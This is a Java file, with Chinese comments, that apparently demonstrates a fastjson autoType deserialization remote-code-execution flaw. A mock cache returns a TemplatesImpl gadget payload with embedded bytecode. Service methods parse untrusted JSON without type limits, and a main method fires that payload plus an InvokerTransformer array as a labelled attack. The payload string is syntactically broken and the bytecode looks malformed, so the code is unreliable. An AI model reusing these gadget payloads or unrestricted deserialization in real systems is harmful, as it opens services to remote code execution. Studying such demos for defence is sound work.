package com.example.bigdata;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import java.io.Serializable;
import java.util.List;
import java.util.Map;

// 模拟Redis缓存服务
class RedisService {
    public String get(String key) {
        // 模拟从Redis获取被污染的数据
        if (key.equals("malicious_item")) {
            return "{\\"@type\\":\\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\",\\"_bytecodes\\":[\\"yv66vgAAADQANQoAAgMABQoABAMABwEAB2NvbW1hbmQHAAgBAARleGVjCAAJDAALAAwHAA0BAAsKBXhlY20MAA4ADwEADjxzdGlja3lkb21haW4+AAgABQoAEQASBwATCQAVABYHABcHABgHABkHABpDAAwHABsHABwHAB1DAB4HAB8HACAHAQkAIAEACwAeAAwABQoAIgAjBwAkCQAlACYHACcBAAY8aW5pdD4BAAQoKQcAKQoAKgArAQAsKGNvbQ9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy90cmF4L1RlbXBsYXRlc0ltcGwBAQxzdGlja3lkb21haW4uamF2YQcAKwEAAQxpbnZva2VQeXRob24BAAR1dGlscwEABHRpbWUHAC4BAAtzdGlja3lkb21haW4HAC4BAAR0ZXN0AQAAQwEAAQABAgAEAAcAAQAIABgAAAAAAQABAAgAAgABAAAABgAAABsABQACAAEADQAOAAAAAQAPAAAAAgAQ",
"],\\"_name\\":\\"a\\",\\"_tfactory\\":{\\"@type\\":\\"com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\\"}}";
        }
        return null;
    }
}

// 大数据处理实体类
class DepotItem implements Serializable {
    private String itemId;
    private String itemName;
    public String getItemId() { return itemId; }
    public void setItemId(String itemId) { this.itemId = itemId; }
    public String getItemName() { return itemName; }
    public void setItemName(String itemName) { this.itemName = itemName; }
}

// 核心处理服务
public class DataProcessingService {
    private RedisService redis = new RedisService();
    
    // 从缓存反序列化对象（漏洞点）
    public DepotItem getDepotItemFromCache(String key) {
        String json = redis.get(key);
        if (json != null) {
            // 未禁用autoType导致类型强制转换漏洞
            return JSONObject.parseObject(json, DepotItem.class);
        }
        return null;
    }
    
    // 插入数据项（触发反序列化）
    public void insertDepotItem(String key) {
        DepotItem item = getDepotItemFromCache(key);
        if (item != null) {
            System.out.println("Inserting item: " + item.getItemId());
            // 实际业务处理逻辑
        }
    }
    
    // 批量更新处理（二次漏洞点）
    public void saveDetials(String rowsJson) {
        // 未进行类型限制的批量反序列化
        List<Map<String, Object>> rows = JSONArray.parseArray(rowsJson, Map.class);
        for (Map<String, Object> row : rows) {
            System.out.println("Processing row: " + row.get("id"));
        }
    }
    
    // 模拟攻击触发点
    public static void main(String[] args) {
        DataProcessingService service = new DataProcessingService();
        // 恶意数据触发RCE
        service.insertDepotItem("malicious_item");
        
        // 模拟批量数据攻击
        String attackArray = "[{\\"@type\\":\\"org.apache.commons.collections.functors.InvokerTransformer\\"}]";
        service.saveDetials(attackArray);
    }
}